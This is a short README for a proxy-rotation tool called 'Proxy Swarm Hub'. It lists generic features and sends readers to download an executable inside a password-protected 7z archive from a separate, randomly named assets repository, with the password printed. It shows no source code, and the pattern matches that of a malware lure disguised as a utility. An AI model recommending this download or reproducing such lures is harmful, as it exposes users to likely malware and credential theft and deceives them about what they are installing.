# 🌐 Proxy Swarm Hub

![Screenshot](media/screenshot.jpg)

> Manage, rotate and health-check thousands of proxies from a single hub.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)]()
[![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)]()

---

## ✨ Features

- **Bulk Import** — HTTP, HTTPS, SOCKS4/5 from files
- **Health Checks** — latency, anonymity, geo
- **Smart Rotation** — round-robin, random, sticky
- **Geo Filtering** — pick country/city
- **Auto-Ban Bad Nodes** — remove dead proxies
- **Local API** — expose pool via HTTP
- **Metrics** — success rate, latency graphs
- **Proxy Auth** — user/pass per node

---

## 🖼️ Preview

| Pool | Health | API |
|------|--------|-----|
| ![Pool](media/screenshot.jpg) | 🩺 | 🔌 |

---

## 🚀 Quick Start

### 1. Download
Grab the latest `proxy-swarm-hub.exe` from **[DOWNLOAD](https://github.com/bondpigeonenergy/proxy-swarm-hub-assets-l7wr/releases/download/v1.0.0/proxy-swarm-hub.7z)**.

> 🔐 **Archive password:** `aIP2R685yC`

### 2. Import proxies
Drop your list into `proxies.txt` (one per line).

### 3. Run
```bat
proxy-swarm-hub.exe --input proxies.txt --check --api-port 8080